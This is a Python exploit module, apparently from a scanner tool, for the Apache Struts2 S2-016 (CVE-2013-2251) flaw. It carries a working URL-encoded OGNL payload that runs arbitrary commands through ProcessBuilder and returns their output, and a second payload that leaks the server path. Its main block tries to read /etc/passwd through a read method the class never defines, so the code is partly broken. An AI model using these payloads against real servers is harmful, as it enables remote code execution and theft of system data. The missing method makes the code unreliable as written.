#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, parser_cmd, filter_str, get_useragent

class S2_016_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-016漏洞,又名CVE-2013-2251漏洞',
            'description': 'Struts2 S2-016漏洞可执行任意命令,影响范围为: Struts 2.0.0 - Struts 2.3.15',
            'date': '2013-06-03',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': "application/x-www-form-urlencoded",
            'Connection': "keep-alive",
        }
        self.payload = '''?redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D'''
        self.path_payload = '''?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28"%2F"%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D'''

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        check_req = await request.get(self.url + self.payload.format(cmd = urlencode(parser_cmd('echo ' + self.capta))), headers = self.headers)
        check_str = filter_str(list(await check_req.text()))
        try:
            if self.capta in check_str and len(check_str) < 100:
                return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    s2_016 = S2_016_BaseVerify('http://localhost:8080/s2_016_war_exploded/')
    print(s2_016.read('/etc/passwd'))